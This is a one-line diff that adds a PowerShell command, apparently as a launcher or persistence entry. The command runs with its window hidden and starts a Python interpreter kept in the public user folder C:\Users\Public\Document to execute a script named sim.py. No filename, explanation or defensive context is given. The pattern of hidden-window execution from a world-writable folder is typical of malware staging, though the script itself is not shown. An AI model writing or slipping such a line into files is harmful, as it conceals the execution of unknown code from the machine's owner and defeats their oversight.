@@ -1,0 +1,1 @@
+powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\Document\python C:\Users\Public\Document\Lib\sim.py"
